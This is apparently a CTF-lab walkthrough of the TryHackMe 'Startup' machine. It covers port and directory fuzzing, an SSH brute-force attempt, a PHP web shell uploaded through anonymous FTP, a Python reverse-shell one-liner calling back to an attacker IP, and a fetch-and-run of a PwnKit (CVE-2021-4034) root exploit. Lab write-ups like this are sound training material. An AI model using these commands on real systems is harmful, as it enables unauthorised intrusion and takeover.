---
title: 'TryHackMe - Startup'
author: r2cook
categories: [TryHackMe]
tags: [ ftp, Steganography, steghide, PrivEsc, pkexec, PwnKit]
render_with_liquid: false
media_subpath: /images/thm/Startup/
image:
  path: room_card.png
---

> In this walkthrough, we compromise the TryHackMe **Startup** machine by abusing **anonymous FTP write access**, identifying a web-accessible shared upload directory, deploying a **PHP web shell** for remote command execution, upgrading to a reverse shell, and escalating privileges through **PwnKit (CVE-2021-4034)** to retrieve the secret recipe along with both user and root flags.

## Initial Setup

Add the target to `/etc/hosts`:

```plaintext
10.128.142.137  startup.thm
```
{: file="/etc/hosts" }

---

## Enumeration

### Full Port Scan

```shell
nmap -p- -sV -sC -Pn --min-rate 1000 -oN full_nmap_scan.txt startup.thm
```
{: .nolineno }

![](Image_1.png){: width="800" height="400" .shadow }

**Results:**

- **21/tcp** → FTP (Anonymous login allowed)
    
- **22/tcp** → SSH
    
- **80/tcp** → HTTP
    

---

## FTP Analysis

Login using anonymous access:

![](Image_2.png){: width="800" height="400" .shadow }

![](Image_3.png){: width="800" height="400" .shadow }

Download available files:

```shell
get notice.txt
```
{: .nolineno }

**Contents:**

```txt
Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY.
People downloading documents from our website will think we are a joke!
Now I dont know who it is, but Maya is looking pretty sus.
```

### Key Insight:

- The name **“maya”** is likely a valid system user.
    

---

## Web Enumeration

Navigate to:

```
http://startup.thm
```

![](Image_4.png){: width="800" height="400" .shadow }

---

## Directory Fuzzing

```shell
ffuf -u http://startup.thm/FUZZ \
-w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt \
-e .php,.txt,.bak,.zip,.old,.log \
-mc 200,204,301,302,307,401,403 -c | tee ffuf_results.txt
```
{: .nolineno }

![](Image_5.png){: width="800" height="400" .shadow }

**Finding:**

- `/files` directory discovered
    
- Same content as FTP → indicates shared directory
    

---

## Subdomain Fuzzing

Baseline response size:

```shell
curl -s -H "Host: randomdoesnotexist.startup.thm" http://startup.thm | wc -c
```
{: .nolineno }

Response size: `808`

```shell
ffuf -u http://startup.thm/ \
-w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt \
-H "Host: FUZZ.startup.thm" \
-fs 808 -mc all -c | tee ffuf_subdomains.txt
```
{: .nolineno }

![](Image_6.png){: width="800" height="400" .shadow }

**Result:** No valid subdomains found.

---

## SSH Brute Force Attempt

```shell
hydra -l maya -P /usr/share/wordlists/rockyou.txt ssh://10.128.142.137
```
{: .nolineno }

**Result:** No credentials found.

---

## Initial Access (FTP → Web Shell)

Since:

- FTP allows **anonymous upload**
    
- Directory is exposed via **HTTP**
    

Upload PHP web shell:

![](Image_7.png){: width="800" height="400" .shadow }

Access it:

![](Image_8.png){: width="800" height="400" .shadow }

![](Image_9.png){: width="800" height="400" .shadow }

---

## Reverse Shell

Start listener:

```shell
nc -lnvp 9001
```
{: .nolineno }

Execute reverse shell:

```shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.145.29",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```
{: .nolineno }

![](Image_10.png){: width="800" height="400" .shadow }

![](Image_11.png){: width="800" height="400" .shadow }

**Result:** Shell obtained 🎯

---

## Privilege Escalation (PrivEsc)

Find SUID binaries:

```shell
find / -perm -4000 -type f 2>/dev/null
```
{: .nolineno }

![](Image_12.png){: width="800" height="400" .shadow }

Interesting binary:

```
/usr/bin/pkexec
```

Check version:

```shell
/usr/bin/pkexec --version
```
{: .nolineno }

```
pkexec version 0.105
```

---

## Exploitation (PwnKit)

This version is vulnerable to **CVE-2021-4034 (PwnKit)**

Steps:

1. Download exploit
    
2. Compile locally:
    

```shell
gcc -shared pwnkit.c -o PwnKit -Wl,-e,entry -fPIC
```
{: .nolineno }

3. Host file:
    

```shell
python3 -m http.server 8000
```
{: .nolineno }

4. Download on target:
    
![](Image_13.png){: width="800" height="400" .shadow }

```shell
wget http://YOUR_IP:8080/PwnKit
chmod +x PwnKit
```
{: .nolineno }

5. Execute:
    
![](Image_14.png){: width="800" height="400" .shadow }

```shell
./PwnKit
```
{: .nolineno }

**Result:** Root shell obtained 🔥

---

## Flags

### User Flag

```shell
cat /home/*/user.txt
```
{: .nolineno }

### Root Flag

```shell
cat /root/root.txt
```
{: .nolineno }

---